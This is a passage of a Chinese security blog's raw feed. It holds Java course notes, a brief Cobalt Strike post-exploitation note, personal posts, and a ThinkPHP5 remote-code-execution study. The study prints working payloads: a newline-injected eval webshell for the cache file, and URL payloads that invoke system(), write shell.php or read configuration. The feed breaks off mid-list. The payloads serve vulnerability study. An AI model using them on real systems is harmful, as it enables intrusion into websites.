class="headerlink" title="接口继承"></a>接口继承</h2><p>一个<code>interface</code>可以继承自另一个<code>interface</code>。<code>interface</code>继承自<code>interface</code>使用<code>extends</code>，它相当于扩展了接口的方法。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Person</span> <span class="keyword">extends</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">String <span class="title">getName</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时，<code>Person</code>接口继承自<code>Hello</code>接口，因此，<code>Person</code>接口现在实际上有3个抽象方法签名，其中一个来自继承的<code>Hello</code>接口。</p><p>Java的接口（interface）定义了纯抽象规范，一个类可以实现多个接口；</p><p>接口也是数据类型，适用于向上转型和向下转型；</p><p>接口的所有方法都是抽象方法，接口不能定义实例字段；</p><p>接口可以定义<code>default</code>方法（JDK&gt;=1.8）。</p><h1 id="包"><a href="#包" class="headerlink" title="包"></a>包</h1><p>Java 中，通过包来解决名称冲突的问题。在Java中，我们使用<code>package</code>来解决名字冲突。</p><p>在Java虚拟机执行的时候，JVM只看完整类名，因此，只要包名不同，类就不同。</p><p>包可以是多层结构，用<code>.</code>隔开。例如：<code>java.util</code>。</p><blockquote><p>要特别注意：包没有父子关系。java.util和java.util.zip是不同的包，两者没有任何继承关系。</p></blockquote><p>我们还需要按照包结构把上面的Java文件组织起来。假设以<code>package_sample</code>作为根目录，<code>src</code>作为源码目录，那么所有文件结构就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package_sample</span><br><span class="line">└─ src</span><br><span class="line">    ├─ hong</span><br><span class="line">    │  └─ Person.java</span><br><span class="line">    │  ming</span><br><span class="line">    │  └─ Person.java</span><br><span class="line">    └─ mr</span><br><span class="line">       └─ jun</span><br><span class="line">          └─ Arrays.java</span><br></pre></td></tr></table></figure><p>编译后的<code>.class</code>文件也需要按照包结构存放。如果使用IDE，把编译后的<code>.class</code>文件放到<code>bin</code>目录下，那么，编译的文件结构就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package_sample</span><br><span class="line">└─ bin</span><br><span class="line">   ├─ hong</span><br><span class="line">   │  └─ Person.class</span><br><span class="line">   │  ming</span><br><span class="line">   │  └─ Person.class</span><br><span class="line">   └─ mr</span><br><span class="line">      └─ jun</span><br><span class="line">         └─ Arrays.class</span><br></pre></td></tr></table></figure><p>编译的命令相对比较复杂，我们需要在<code>src</code>目录下执行<code>javac</code>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -d ..&#x2F;bin ming&#x2F;Person.java hong&#x2F;Person.java mr&#x2F;jun&#x2F;Arrays.java</span><br></pre></td></tr></table></figure><h1 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h1><p>在Java中，我们经常看到<code>public</code>、<code>protected</code>、<code>private</code>这些修饰符。在Java中，这些修饰符可以用来限定访问作用域。</p><h2 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h2><p>在方法内部定义的变量称为局部变量，局部变量作用域从变量声明处开始到对应的块结束。方法参数也是局部变量。</p><p>如果不确定是否需要<code>public</code>，就不声明为<code>public</code>，即尽可能少地暴露对外的字段和方法。</p><p>把方法定义为<code>package</code>权限有助于测试，因为测试类和被测试类只要位于同一个<code>package</code>，测试代码就可以访问被测试类的<code>package</code>权限方法。</p><p>一个<code>.java</code>文件只能包含一个<code>public</code>类，但可以包含多个非<code>public</code>类。如果有<code>public</code>类，文件名必须和<code>public</code>类的名字相同。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>Java内建的访问权限包括<code>public</code>、<code>protected</code>、<code>private</code>和<code>package</code>权限；</p><p>Java在方法内部定义的变量是局部变量，局部变量的作用域从变量声明开始，到一个块结束；</p><p><code>final</code>修饰符不是访问权限，它可以修饰<code>class</code>、<code>field</code>和<code>method</code>；</p><p>一个<code>.java</code>文件只能包含一个<code>public</code>类，但可以包含多个非<code>public</code>类。</p><h1 id="classpath-jar"><a href="#classpath-jar" class="headerlink" title="classpath \ jar"></a>classpath \ jar</h1><h2 id="classpath"><a href="#classpath" class="headerlink" title="classpath"></a>classpath</h2><p><code>classpath</code>是JVM用到的一个环境变量，它用来指示JVM如何搜索<code>class</code>。</p><p>因为Java是编译型语言，源码文件是<code>.java</code>，而编译后的<code>.class</code>文件才是真正可以被JVM执行的字节码。因此，JVM需要知道，如果要加载一个<code>abc.xyz.Hello</code>的类，应该去哪搜索对应的<code>Hello.class</code>文件。</p><p>所以，<code>classpath</code>就是一组目录的集合，它设置的搜索路径与操作系统相关。例如，在Windows系统上，用<code>;</code>分隔，带空格的目录用<code>&quot;&quot;</code>括起来，可能长这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\work\project1\bin;C:\shared;&quot;D:\My Documents\project1\bin&quot;</span><br></pre></td></tr></table></figure><p>在Linux系统上，用<code>:</code>分隔，可能长这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;shared:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;home&#x2F;liaoxuefeng&#x2F;bin</span><br></pre></td></tr></table></figure><p>现在我们假设<code>classpath</code>是<code>.;C:\work\project1\bin;C:\shared</code>，当JVM在加载<code>abc.xyz.Hello</code>这个类时，会依次查找：</p><ul><li>&lt;当前目录&gt;\abc\xyz\Hello.class</li><li>C:\work\project1\bin\abc\xyz\Hello.class</li><li>C:\shared\abc\xyz\Hello.class</li></ul><p>注意到<code>.</code>代表当前目录。如果JVM在某个路径下找到了对应的<code>class</code>文件，就不再往后继续搜索。如果所有路径下都没有找到，就报错。</p><p><code>classpath</code>的设定方法有两种：</p><p>在系统环境变量中设置<code>classpath</code>环境变量，不推荐；</p><p>在启动JVM时设置<code>classpath</code>变量，推荐。</p><p>我们强烈<em>不推荐</em>在系统环境变量中设置<code>classpath</code>，那样会污染整个系统环境。在启动JVM时设置<code>classpath</code>才是推荐的做法。实际上就是给<code>java</code>命令传入<code>-classpath</code>或<code>-cp</code>参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -classpath .;C:\work\project1\bin;C:\shared abc.xyz.Hello</span><br></pre></td></tr></table></figure><p>或者使用<code>-cp</code>的简写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp .;C:\work\project1\bin;C:\shared abc.xyz.Hello</span><br></pre></td></tr></table></figure><p>没有设置系统环境变量，也没有传入<code>-cp</code>参数，那么JVM默认的<code>classpath</code>为<code>.</code>，即当前目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java abc.xyz.Hello</span><br></pre></td></tr></table></figure><h2 id="jar包"><a href="#jar包" class="headerlink" title="jar包"></a>jar包</h2><p>如果有很多<code>.class</code>文件，散落在各层目录中，肯定不便于管理。如果能把目录打一个包，变成一个文件，就方便多了。</p><p>jar包就是用来干这个事的，它可以把<code>package</code>组织的目录层级，以及各个目录下的所有文件（包括<code>.class</code>文件和其他文件）都打成一个jar文件，这样一来，无论是备份，还是发给客户，就简单多了。</p><p>jar包实际上就是一个zip格式的压缩文件，而jar包相当于目录。如果我们要执行一个jar包的<code>class</code>，就可以把jar包放到<code>classpath</code>中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp .&#x2F;hello.jar abc.xyz.Hello</span><br></pre></td></tr></table></figure><p>这样JVM会自动在<code>hello.jar</code>文件里去搜索某个类。</p><p>jar包还可以包含一个特殊的<code>/META-INF/MANIFEST.MF</code>文件，<code>MANIFEST.MF</code>是纯文本，可以指定<code>Main-Class</code>和其它信息。JVM会自动读取这个<code>MANIFEST.MF</code>文件，如果存在<code>Main-Class</code>，我们就不必在命令行指定启动的类名，而是用更方便的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar hello.jar</span><br></pre></td></tr></table></figure><hr><p>当然，肯定用 maven 这个命令来打包jar 包啦。</p><h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp app.jar:a.jar:b.jar:c.jar com.liaoxuefeng.sample.Main</span><br></pre></td></tr></table></figure><p>如果漏写了某个运行时需要用到的jar，那么在运行期极有可能抛出<code>ClassNotFoundException</code>。</p><p>所以，jar只是用于存放class的容器，它并不关心class之间的依赖。</p><p>从Java 9开始引入的模块，主要是为了解决“依赖”这个问题。如果<code>a.jar</code>必须依赖另一个<code>b.jar</code>才能运行，那我们应该给<code>a.jar</code>加点说明啥的，让程序在编译和运行的时候能自动定位到<code>b.jar</code>，这种自带“依赖关系”的class容器就是模块。</p><h1 id="Java-上机实验Last-one"><a href="#Java-上机实验Last-one" class="headerlink" title="Java 上机实验Last one"></a>Java 上机实验Last one</h1><h2 id="继承-1"><a href="#继承-1" class="headerlink" title="继承"></a>继承</h2><h2 id="多态-1"><a href="#多态-1" class="headerlink" title="多态"></a>多态</h2><h2 id="抽象类-1"><a href="#抽象类-1" class="headerlink" title="抽象类"></a>抽象类</h2><h2 id="接口-1"><a href="#接口-1" class="headerlink" title="接口"></a>接口</h2>]]></content>
    
    
    <summary type="html">记录一些Java知识</summary>
    
    
    
    
    <category term="Dev" scheme="https://hack-for.fun/tags/Dev/"/>
    
    <category term="作业" scheme="https://hack-for.fun/tags/%E4%BD%9C%E4%B8%9A/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike</title>
    <link href="https://hack-for.fun/558a.html"/>
    <id>https://hack-for.fun/558a.html</id>
    <published>2020-11-04T13:33:44.000Z</published>
    <updated>2020-11-04T15:33:14.631Z</updated>
    
    <content type="html"><![CDATA[<p>记录一些关于cs的东西~</p><h1 id="CS-派生-MSF"><a href="#CS-派生-MSF" class="headerlink" title="CS 派生 MSF"></a>CS 派生 MSF</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201104225034.png" alt="image-20201104213742247"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201104233130.png" alt="image-20201104213816240"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201104213842.png" alt="image-20201104213839479"></p><h1 id="通过powershell来增强cs的实用性"><a href="#通过powershell来增强cs的实用性" class="headerlink" title="通过powershell来增强cs的实用性"></a>通过powershell来增强cs的实用性</h1><h2 id="在beacon-shell中导入外部ps脚本到远程机器上"><a href="#在beacon-shell中导入外部ps脚本到远程机器上" class="headerlink" title="在beacon shell中导入外部ps脚本到远程机器上"></a>在beacon shell中导入外部ps脚本到远程机器上</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell-import &#x2F;root&#x2F;test.ps1 &#x2F;&#x2F;导入各种powershell脚本，这里可以导入nishang模块</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">powershell  posershell脚本名</span><br></pre></td></tr></table></figure><h2 id="在beacon-shell中直接执行powershell代码"><a href="#在beacon-shell中直接执行powershell代码" class="headerlink" title="在beacon shell中直接执行powershell代码"></a>在beacon shell中直接执行powershell代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powerpick Get-Host</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201104213434.png" alt="image-20201104213433262"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;记录一些关于cs的东西~&lt;/p&gt;
&lt;h1 id=&quot;CS-派生-MSF&quot;&gt;&lt;a href=&quot;#CS-派生-MSF&quot; class=&quot;headerlink&quot; title=&quot;CS 派生 MSF&quot;&gt;&lt;/a&gt;CS 派生 MSF&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="CobaltStrike" scheme="https://hack-for.fun/tags/CobaltStrike/"/>
    
    <category term="渗透工具" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>2020小组招新有感</title>
    <link href="https://hack-for.fun/abc8.html"/>
    <id>https://hack-for.fun/abc8.html</id>
    <published>2020-10-23T16:56:04.000Z</published>
    <updated>2020-11-07T15:13:03.950Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>2020年小组招新伴随着今天的宣讲会的结束，也算是告一段落了。当然后面还有二面、三面，等面试相关的工作。这些问题都不大了。</p></blockquote><p>在这里，我以道格19级成员的身份，写一篇感受吧。</p><p>感受最深的，其实就是一个团体、一个组织，一定要有团结力、凝聚力。大家都一心往小组的未来发展考虑，有什么事大家一起分工协作，有难题大家一起想办法解决。</p><p>当然，这个过程中也有不好的体验。一个团体，不免会有出现划水的情况，部分师傅不够积极也是能够直接感受到的，但是不能说不好，毕竟这个感受是通过和其他团体成员比较得出的感受，不针对个人。</p><p>从谋划招新计划、到招新摆摊、申请宣讲会教室。两个管理小姐姐、<a href="http://xun9er.com/">Xun9er</a> 、和小帅锅，和学校层面、学校社团方面，还是有过不少的对线，也很辛苦。</p><p>招新摆摊那两天、老是下着小雨、第一天人还可算多、第二天人就慢慢少起来了。不过是新生少了，我们的人也少了。确实， 我们每天的事也挺多了，也不能把所有精力投入到招新工作中。蚊子多、湿冷。最后一晚上、搬离设施的时候、就来了4-5个小伙伴。</p><p>好在拉了个小群，也就10 个人在里面，活跃的也不过就3-4个人。里面还是有2-3个学弟我认为还比较可以，希望他们能够努力学习、通过考核。</p><p>宣讲会上，第一次感觉一个小组在一起办事、真的会方便很多。也拍了拍合照，也算是第一次拍正式合照了。</p><p>宣讲会，问了下学弟的评价，还算可以。会上，我也听到大家都笑了，这就对了。</p><p>最后，继续野蛮生长吧。我们还有很长的路要走，未来的发展，离不开每一个成员的努力，CTF排名、SRC挖洞、CVE、CNVD、大厂offer，是我们每个人奋斗的目标。</p><p>对了，我们不光只会搞技术， 我们也是很活泼开朗可爱的一群人呀！</p><p>照片就不放了，哈哈。想看加我微信或者QQ吧。</p><ul><li>博文删除密码</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2020年11月 7日 星期六 23时12分37秒 CST</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;2020年小组招新伴随着今天的宣讲会的结束，也算是告一段落了。当然后面还有二面、三面，等面试相关的工作。这些问题都不大了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在这里，我以道格19级成员的身份，写一篇感受吧。&lt;/p&gt;
&lt;p&gt;感受最深的，其实就</summary>
      
    
    
    
    
    <category term="杂碎" scheme="https://hack-for.fun/tags/%E6%9D%82%E7%A2%8E/"/>
    
  </entry>
  
  <entry>
    <title>MacOS 如何修改账户名</title>
    <link href="https://hack-for.fun/63e5.html"/>
    <id>https://hack-for.fun/63e5.html</id>
    <published>2020-10-17T16:01:49.000Z</published>
    <updated>2020-10-17T16:13:31.788Z</updated>
    
    <content type="html"><![CDATA[<p>之前激活MacBook Pro的时候，本来打算拿回家激活的，但是太古里Apple的人员太热情啦，我就在小姐姐哪里激活了，一顿下一步，导致了我的用户名是我的真名。有时候写笔记、文章啥的，总感觉不舒服。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000438.png" alt="image-20201018000436765"></p><p>然后之前一直想修改，但是哪里是灰色的，无法修改。</p><p>修改后：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000535.png" alt="image-20201018000534179"></p><p>修改方法：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000610.png" alt="image-20201018000608993"></p><p>点击锁，输入密码之后就可以进行操作了。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000635.png" alt="image-20201018000633434"></p><p>然后点击 + 号，新建一个管理员用户。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000720.png" alt="image-20201018000719065"></p><ul><li>退出当前登录的用户（也是因为当前这个用户是处于登录状态，所以无法直接修改account name。</li><li>登录创建的test 管理员账号，直接跳过Apple ID 之类的设置，然后去修改account name。</li><li>切换回来就OK了。</li><li>删除创建的test 管理员用户。</li></ul><p>原来这样简单。</p><blockquote><p>其实很多事情，或许都简单，只是在于自己愿不愿意去做。</p></blockquote><p>最近也是心神不定的，好好学习嘛！Docker 逃逸好几种方法都没复现成功，淦。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前激活MacBook Pro的时候，本来打算拿回家激活的，但是太古里Apple的人员太热情啦，我就在小姐姐哪里激活了，一顿下一步，导致了我的用户名是我的真名。有时候写笔记、文章啥的，总感觉不舒服。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr</summary>
      
    
    
    
    
    <category term="杂碎" scheme="https://hack-for.fun/tags/%E6%9D%82%E7%A2%8E/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5漏洞学习-RCE</title>
    <link href="https://hack-for.fun/a45.html"/>
    <id>https://hack-for.fun/a45.html</id>
    <published>2020-09-23T03:04:09.000Z</published>
    <updated>2020-09-27T13:39:21.764Z</updated>
    
    <content type="html"><![CDATA[<p>主要参考资料：</p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/">https://github.com/Mochazz/ThinkPHP-Vuln/</a></p><h1 id="RCE1-利用缓存文件GetShell从而RCE"><a href="#RCE1-利用缓存文件GetShell从而RCE" class="headerlink" title="RCE1(利用缓存文件GetShell从而RCE)"></a>RCE1(利用缓存文件GetShell从而RCE)</h1><p>相关参考资料：<a href="https://www.cnblogs.com/zpchcbd/p/12546340.html">https://www.cnblogs.com/zpchcbd/p/12546340.html</a></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;thinkphp5:8888&#x2F;public&#x2F;?username&#x3D;test%0d%0a@eval($_GET[_]);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172609.png" alt="image-20200923114608784"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172619.png" alt="image-20200923124814752"></p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><blockquote><p>漏洞存在于 <strong>ThinkPHP</strong> 的缓存类中。该类会将缓存数据通过序列化的方式，直接存储在 <code>.php</code> 文件中，攻击者通过精心构造的 <strong>payload</strong> ，即可将 <strong>webshell</strong> 写入缓存文件。缓存文件的名字和目录均可预测出来，一旦缓存目录可访问或结合任意文件包含漏洞，即可触发 <strong>远程代码执行漏洞</strong> 。</p></blockquote><p>漏洞利用前提：</p><ul><li><p>站点能够将缓存文件列出，并且用户可以得到路径</p></li><li><p>1、缓存使用文件方式并且缓存目录暴露在web目录下面<br>2、攻击者要能猜到开发者使用的缓存key</p></li><li><p>知道缓存类所设置的键名，这样才能找到 <strong>webshell</strong> 路径；其次如果按照官方说明开发程序， <strong>webshell</strong> 最终会被写到 <strong>runtime</strong> 目录下，而官方推荐 <strong>public</strong> 作为 <strong>web</strong> 根目录，所以即便我们写入了 <strong>shell</strong> ，也无法直接访问到；最后如果程序有设置 <strong>$this-&gt;options[‘prefix’]</strong> 的话，在没有源码的情况下，我们还是无法获得 <strong>webshell</strong> 的准确路径。</p></li><li><blockquote><p>5.0的部署建议是public目录作为web目录访问内容，其它都是web目录之外，当然，你必须要修改public/index.php中的相关路径</p></blockquote></li></ul><p>比如这里修改的index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Cache</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Cache::set(<span class="string">&quot;name&quot;</span>,input(<span class="string">&quot;get.username&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Cache success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.10</strong></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在ThinkPHP 的5.0.11 release 信息中：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172420.png" alt="image-20200923125619050"></p><p>更新了完善缓存驱动(安全更新)。再去查看commit记录。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923160412.png" alt="image-20200923130139007"></p><p>修复方式为将缓存文件的内容拼接到<code>&lt;?php ?&gt;</code> 标签之外，并且使用了<code>exit()</code>函数来退出当前脚本。</p><p>可下断点进行单步调试，观察整个参数在Cache类以及Request类下进过相关方法的过滤，转换，并最终写入了缓存文件的过程。</p><p>首先是<code>Cache::set(&quot;name&quot;,input(&quot;get.username&quot;));</code> 未实例化，所以为调用<code>autoload</code>方法，自动加载机制来进行一系列实例化操作。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172411.png" alt="image-20200923161825336"></p><p>然后到helper.php 中的 <code>input</code>方法，判断请求的方法和请求的参数，此处为<code>get.username</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172318.png" alt="image-20200923162505424"></p><p>然后返回过滤后的值，继续调用<code>Request</code> 类的 <code>get</code> 方法和 <code>Input</code> 方法（在TP5)中参数的处理都是这样的了，</p><p>经过<code>filterVaule</code>和<code>filterExp</code>函数进行特殊字符过滤和相关判段后返回给<code>$data</code></p><hr><p>然后来到Cache 类的<code>set</code>方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172308.png" alt="image-20200923164241136"></p><p>调用了Cache 类的init 方法，该方法继续调用了 Config里的get方法，这些操作是在为缓存内容做一些初始化操作。然后再到Cache 类的 connect 方法，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172114.png" alt="image-20200923164824257"></p><p>为缓存文件的文件名进行md5返回。这里的<code>self::handler</code>为<code>think\cache\driver\File</code>类。所以会调用<code>File</code>类的<code>set</code>方法。该方法调用了<code>getCacheKey</code>方法来获取缓存文件的文件名。文件名的机制如下图，先是对<code>$name</code> md5，然后截取前两位作为目录名，后面部分作为文件名然后和<code>.php</code>后缀进行拼接。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172102.png" alt="image-20200923165836437"></p><p>看看set方法的处理流程：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172037.png" alt="image-20200923170741256"></p><p>最后通过<code>file_put_contents</code>函数，将<code>$data</code>（参数内容可控，并且没有对data参数进行任何过滤等操作，只是序列化后拼接存储在文件中，这里的 <strong>$this-&gt;options[‘data_compress’]</strong> 变量默认情况下为 <strong>false</strong> ，所以数据不会经过 <strong>gzcompress</strong> 函数处理。虽然在序列化数据前面拼接了单行注释符 <strong>//</strong> ，但是我们可以通过注入换行符绕过该限制。） 写入<code>$filename</code>从而GetShell。</p><blockquote><p>最后如果程序有设置 <strong>$this-&gt;options[‘prefix’]</strong> 的话(也就是上上图中的设置文件名前缀的代码)，在没有源码的情况下，我们还是无法获得 <strong>webshell</strong> 的准确路径。</p></blockquote><h2 id="利用总结"><a href="#利用总结" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923173430.png"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>1，thinkphp3.2的版本请选择开启：DATA_CACHE_KEY 这样就算你使用的cms是开源的人家发现了这个也无法使用。<br>2，tp3.2-tp5  做好目录权限，除公共目录绝对不要让外部可访问</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923160412.png" alt="image-20200923130139007"></p><h1 id="RCE2-利用任意控制器调用RCE"><a href="#RCE2-利用任意控制器调用RCE" class="headerlink" title="RCE2(利用任意控制器调用RCE)"></a>RCE2(利用任意控制器调用RCE)</h1><blockquote><p>控制器过滤不严，结合直接返回类名的代码操作，导致可以用命名空间的方式来调用任意类的任意方法</p></blockquote><p>获取复现代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.1.0 tpdemo</span><br></pre></td></tr></table></figure><p>修改composer.json 的  require 字段。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.6.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.1.30&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>composer update</p><p>相关参考资料：</p><p><strong>感觉自己分析的不好，要学习还是去看参考资料吧。</strong></p><p><a href="https://xz.aliyun.com/t/3570">https://xz.aliyun.com/t/3570</a></p><p><a href="https://www.smi1e.top/thinkphp-5-x-rce-%E5%88%86%E6%9E%90/">https://www.smi1e.top/thinkphp-5-x-rce-%E5%88%86%E6%9E%90/</a></p><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><p><strong>5.1.x</strong> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure><p><strong>5.0.x</strong> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # 获取配置信息</span><br><span 